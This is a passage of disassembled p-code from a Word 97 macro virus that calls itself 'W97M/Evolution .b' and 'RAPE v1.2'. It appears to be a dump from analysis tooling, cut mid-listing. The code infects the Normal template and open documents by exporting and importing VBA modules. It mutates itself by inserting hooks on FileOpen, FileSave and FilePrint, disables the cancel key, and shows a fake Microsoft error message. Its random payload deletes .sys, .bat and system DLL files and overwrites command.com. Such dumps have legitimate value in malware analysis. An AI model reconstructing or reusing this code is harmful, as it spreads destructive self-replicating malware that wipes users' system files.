' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #101:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #102:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #103:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #104:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #105:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #106:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #107:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #108:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #109:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #110:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #111:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #112:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #114:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld x 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID 
' Line #115:
' 	QuoteRem 0x0000 0x001F " RAPE v1.2 Export File ID Morph"
' Line #116:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID 
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #119:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #120:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #121:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #122:
' 	Label rite 
' Line #123:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #126:
' 	Label nex 
' Line #127:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	LitStr 0x001D "C:\windows\system\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St CheckMe 
' Line #129:
' 	Ld CheckMe 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nextt 
' 	EndIf 
' Line #130:
' 	Do 
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #133:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #134:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #135:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #136:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #137:
' 	Label nextt 
' Line #138:
' 	ExitFunc 
' Line #139:
' 	Label Recognize 
' Line #140:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #141:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #143:
' 	LitStr 0x001D "C:\windows\system\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St CheckMe 
' Line #144:
' 	Ld CheckMe 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tryharder 
' 	EndIf 
' Line #145:
' 	Do 
' Line #146:
' 	OnError (Resume Next) 
' Line #147:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #148:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #149:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #150:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #151:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #152:
' 	Label tryharder 
' Line #153:
' 	EndFunc 
' Line #154:
' 	FuncDefn (Function Polymorphic_Check())
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #157:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #158:
' 	Dim 
' 	VarDefn FC_Check
' Line #159:
' 	Do 
' Line #160:
' 	LitDI2 0x0001 
' 	Ld FC_Check 
' 	LineInput 
' Line #161:
' 	Ld FC_Check 
' 	LitStr 0x000F "Sub FileClose()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FC_There 
' 	BoS 0x0000 
' 	GoTo FO_Look 
' 	EndIf 
' Line #162:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #163:
' 	Label FO_Look 
' Line #164:
' 	Dim 
' 	VarDefn FO_Check
' Line #165:
' 	Do 
' Line #166:
' 	LitDI2 0x0001 
' 	Ld FO_Check 
' 	LineInput 
' Line #167:
' 	Ld FO_Check 
' 	LitStr 0x000E "Sub FileOpen()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FO_There 
' 	BoS 0x0000 
' 	GoTo FP_Look 
' 	EndIf 
' Line #168:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #169:
' 	Label FP_Look 
' Line #170:
' 	Dim 
' 	VarDefn FP_Check
' Line #171:
' 	Do 
' Line #172:
' 	LitDI2 0x0001 
' 	Ld FP_Check 
' 	LineInput 
' Line #173:
' 	Ld FP_Check 
' 	LitStr 0x000F "Sub FilePrint()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FP_There 
' 	BoS 0x0000 
' 	GoTo FN_Look 
' 	EndIf 
' Line #174:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #175:
' 	Label FN_Look 
' Line #176:
' 	Dim 
' 	VarDefn FN_Check
' Line #177:
' 	Do 
' Line #178:
' 	LitDI2 0x0001 
' 	Ld FN_Check 
' 	LineInput 
' Line #179:
' 	Ld FN_Check 
' 	LitStr 0x000D "Sub FileNew()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FN_There 
' 	BoS 0x0000 
' 	GoTo FS_Look 
' 	EndIf 
' Line #180:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #181:
' 	Label FS_Look 
' Line #182:
' 	Dim 
' 	VarDefn FS_Check
' Line #183:
' 	Do 
' Line #184:
' 	LitDI2 0x0001 
' 	Ld FS_Check 
' 	LineInput 
' Line #185:
' 	Ld FS_Check 
' 	LitStr 0x000E "Sub FileSave()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FS_There 
' 	BoS 0x0000 
' 	GoTo FSA_Look 
' 	EndIf 
' Line #186:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #187:
' 	Label FSA_Look 
' Line #188:
' 	Dim 
' 	VarDefn FSA_Check
' Line #189:
' 	Do 
' Line #190:
' 	LitDI2 0x0001 
' 	Ld FSA_Check 
' 	LineInput 
' Line #191:
' 	Ld FSA_Check 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FSA_There 
' 	BoS 0x0000 
' 	ExitFunc 
' 	EndIf 
' Line #192:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #193:
' 	EndFunc 
' Line #194:
' 	FuncDefn (Function Payload())
' Line #195:
' 	OnError (Resume Next) 
' Line #196:
' 	QuoteRem 0x0000 0x0025 "Now we got a nasty little payload...."
' Line #197:
' 	LitStr 0x000D "C:\error1.sys"
' 	ArgsLd Dir 0x0001 
' 	St Check$ 
' Line #198:
' 	Ld Check$ 
' 	LitStr 0x000A "error1.sys"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #199:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #200:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #201:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #202:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "echo Everything must change"
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #205:
' 	EndIfBlock 
' Line #206:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #207:
' 	LitStr 0x000E "C:\command.com"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "W97M/Evolution .b!!"
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #212:
' 	LitStr 0x0008 "C:\*.sys"
' 	ArgsCall Kill 0x0001 
' Line #213:
' 	LitStr 0x0008 "C:\*.bat"
' 	ArgsCall Kill 0x0001 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Eq 
' 	IfBlock 
' Line #216:
' 	LitStr 0x0017 "C:\windows\system\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	IfBlock 
' Line #219:
' 	LitStr 0x0016 "C:\windows\Control.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0000 
' 	Seek 
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "[Screen Saver.3DText]"
' 	PrintItemNL 
' Line #222:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "DemoType = 0"
' 	PrintItemNL 
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "RotStyle = 3"
' 	PrintItemNL 
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Tesselation = 100"
' 	PrintItemNL 
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Size = 100"
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Speed = 100"
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "SurfStyle = 0"
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Font = Comic Sans MS"
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "FontAttributes = 0"
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Charset = 0"
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Text = Evolution"
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Texture = None"
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "TextureFileOffset = 3"
' 	PrintItemNL 
' Line #234:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #235:
' 	EndIfBlock 
' Line #236:
' 	Ld x 
' 	LitDI2 0x004B 
' 	Eq 
' 	IfBlock 
' Line #237:
' 	QuoteRem 0x0000 0x002E " I love this nice little trick for Dr. Solomon"
' Line #238:
' 	LitStr 0x0015 "C:\windows\import.exe"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #239:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "ZQZXJVBVT"
' 	PrintItemNL 
' Line #240:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Oops looks like you got a 'virus'"
' 	PrintItemNL 
' Line #241:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	Ld x 
' 	LitDI2 0x0045 
' 	Eq 
' 	IfBlock 
' Line #244:
' 	LitStr 0x0018 "C:\windows\Evolution.bmp"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #245:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "dedicated to that special little someone.."
' 	PrintItemNL 
' Line #246:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "She knows who she is..."
' 	PrintItemNL 
' Line #247:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #248:
' 	EndIfBlock 
' Line #249:
' 	Ld x 
' 	LitDI2 0x0053 
' 	Eq 
' 	IfBlock 
' Line #250:
' 	LitStr 0x001D "C:\windows\system\data101.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #251:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Word97 Macro Evolution .b"
' 	PrintItemNL 
' Line #252:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #253:
' 	EndIfBlock 
' Line #254:
' 	EndFunc 
' Line #255:
' 	FuncDefn (Function Evolve())
' Line #256:
' 	OnError (Resume Next) 
' Line #257:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #258:
' 	QuoteRem 0x0000 0x0047 "RAPE v1.2 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)"
' Line #259:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #260:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #261:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #262:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0096 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St PM 
' Line #263:
' 	Ld PM 
' 	LitDI2 0x0016 
' 	Eq 
' 	IfBlock 
' Line #264:
' 	Ld FC_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #265:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #266:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FileClose()"
' 	PrintItemNL 
' Line #267:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On error resume next"
' 	PrintItemNL 
' Line #268:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #269:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "Wordbasic.FileSave"
' 	PrintItemNL 
' Line #270:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #271:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #272:
' 	EndIfBlock 
' Line #273:
' 	Ld PM 
' 	LitDI2 0x0049 
' 	Eq 
' 	IfBlock 
' Line #274:
' 	Ld FO_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #275:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #276:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileOpen()"
' 	PrintItemNL 
' Line #277:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #278:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Dialogs(wdDialogFileOpen)"
' 	PrintItemNL 
' Line #279:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #280:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #281:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #282:
' 	EndIfBlock 
' Line #283:
' 	Ld PM 
' 	LitDI2 0x0045 
' 	Eq 
' 	IfBlock 
' Line #284:
' 	Ld FP_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #285:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #286:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FilePrint()"
' 	PrintItemNL 
' Line #287:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #288:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Dialogs(wdDialogFilePrint)"
' 	PrintItemNL 
' Line #289:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #290:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End sub"
' 	PrintItemNL 
' Line #291:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #292:
' 	EndIfBlock 
' Line #293:
' 	Ld PM 
' 	LitDI2 0x007A 
' 	Eq 
' 	IfBlock 
' Line #294:
' 	Ld FN_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #295:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #296:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Sub FileNew()"
' 	PrintItemNL 
' Line #297:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #298:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Dialogs(wdDialogFileNew)"
' 	PrintItemNL 
' Line #299:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #300:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #301:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #302:
' 	EndIfBlock 
' Line #303:
' 	Ld PM 
' 	LitDI2 0x005A 
' 	Eq 
' 	IfBlock 
' Line #304:
' 	Ld FS_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #305:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #306:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #307:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #308:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "call Evolution"
' 	PrintItemNL 
' Line #309:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #310:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #311:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #312:
' 	EndIfBlock 
' Line #313:
' 	Ld PM 
' 	LitDI2 0x0008 
' 	Eq 
' 	IfBlock 
' Line #314:
' 	Ld FSA_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #315:
' 	Ld FileID2 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #316:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	PrintItemNL 
' Line #317:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #318:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Dialogs(wdDialogFileSaveAs)"
' 	PrintItemNL 
' Line #319:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Evolution"
' 	PrintItemNL 
' Line #320:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #321:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #322:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #323:
' 	EndIfBlock 
' Line #324:
' 	EndFunc 
' Line #325:
' 	FuncDefn (Function Norminf())
' Line #326:
' 	OnError (Resume Next) 
' Line #327:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #328:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #329:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #330:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #331:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #332:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nexus 
' 	EndIf 
' Line #333:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #334:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #335:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #336:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #337:
' 	EndIfBlock 
' Line #338:
' 	Label nexus 
' Line #339:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #340:
' 	StartWithExpr 
' 	Ld FileID2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #341:
' 	EndWith 
' Line #342:
' 	LitStr 0x0092 "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support."
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #343:
' 	EndFunc 
' Line #344:
' 	FuncDefn (Function FileInft())
' Line #345:
' 	OnError (Resume Next) 
' Line #346:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #347:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #348:
' 	LitDI2 0x0001 
' 	Ld FileID2 
' 	LineInput 
' Line #349:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #350:
' 	StartWithExpr 
' 	Ld FileID2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #351:
' 	EndWith 
' Line #352:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #353:
' 	LitDI2 0x0001 
